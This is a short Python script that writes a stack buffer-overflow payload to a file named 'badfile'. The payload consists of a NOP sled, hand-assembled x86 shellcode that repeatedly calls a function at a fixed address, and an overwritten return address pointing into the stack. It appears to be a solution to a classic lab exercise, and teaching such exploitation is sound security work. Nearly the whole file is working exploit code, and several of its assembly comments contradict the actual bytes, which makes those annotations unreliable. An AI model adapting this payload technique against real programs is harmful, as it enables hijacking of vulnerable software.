shellcode = (
"\x6a\x06"
"\x6a\x01"             #push   4             (Setting Parameter x1 = 4)
"\xbb\x10\x85\x04\x08" #mov    ebx,0x804853e (Move entry point of bar to edx) 0x08048510
"\xff\xd3"             #call   ebx           (Call the function bar)
"\x6a\x00"
"\x50"                 #push   eax           (Return value is stored at eax. 
                     #                      Setting Paratemer x1 = last return value)
"\xff\xd3"             #call   ebx           (Calling bar again)
"\x6a\x05"
"\x50"
"\xff\xd3"             #call   ebx           (Calling bar again)
"\x6a\x00"
"\x50"
"\xff\xd3"             #call   ebx           (Calling bar again)
"\x6a\x03"
"\x50"
"\xff\xd3"             #call   ebx           (Calling bar again)
"\x6a\x08"
"\x50"
"\xff\xd3"             #call   ebx           (Calling bar again)
).encode('latin-1')



# Fill the content with NOPs
content = bytearray(0x90 for i in range(1684))

# Put the shellcode at the beginning
start = 1684-len(shellcode)
content[start:] = shellcode

# Put the "ebp" address
ret = 0xbfffe6c8 + 300

content[308 + 4 : 308 + 8] = (ret).to_bytes(4,byteorder='little')


	

#content = bytearray(0x41 for i in range(20))
#write
with open('badfile','wb') as f:
    f.write(content)

